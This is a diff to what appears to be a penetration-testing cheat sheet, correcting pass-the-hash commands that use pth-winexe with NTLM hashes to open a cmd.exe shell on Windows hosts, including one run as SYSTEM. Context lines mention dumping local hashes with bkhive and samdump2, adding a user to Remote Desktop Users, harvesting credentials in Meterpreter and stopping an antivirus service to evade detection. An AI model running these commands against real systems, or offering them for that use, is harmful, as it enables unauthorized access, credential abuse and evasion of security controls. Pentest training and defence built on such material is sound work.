@@ -389,12 +389,12 @@ NET LOCALGROUP "Remote Desktop Users" keyoke /ADD
 Example :<br>
 
 ```
-pth-winexe -U DOMAIN/USERNAME%aad3b435b51404eeaad3b435b51404ee:88f011206629f5554d95d105adcbf4bd7 //IP_Server cmd.exe
+pth-winexe -U DOMAIN/USERNAME%cc5e9acbad1b25c9aad3b435b51404ee:996e6760cddd8815a2c24a110cf040fb //IP_Server cmd.exe
 ```
 Real exempale :<br>
 
 ```
-pth-winexe -U LAB/Administrator%aad3b435b51404eeaad1123b51404ee:92f01006629f5554d95d105adcbf4bd7 //192.168.1.44 cmd.exe
+pth-winexe -U LAB/Administrator%cc5e9acbad1b25c9aad3b435b51404ee:996e6760cddd8815a2c24a110cf040fb //192.168.1.44 cmd.exe
 ```
 # PTH-winexe to Meterpreter
 ```
@@ -432,7 +432,7 @@ meterpreter > cred_all
 During our latest pentest, we faced shitty AV problem since we couldn't get any meterpreter session with psexec cuz of Symatec AV, So we would like to share our solution for this problem:
 First We Need to connect with the local admin as system using pth (local hash extracted with bkhive and samdump2)
 
-$./pth-winexe -U DOMAIN.COM/USERNAMEcc5e9acbad1b25c9aad3b435b51404ee:996e6760cddd8815a2c24a110cf040fb //10.0.42.154 cmd --system
+$./pth-winexe -U DOMAIN.COM/USERNAME%cc5e9acbad1b25c9aad3b435b51404ee:996e6760cddd8815a2c24a110cf040fb //10.0.42.154 cmd --system
 
 Then let's Stop the AV  Service
 
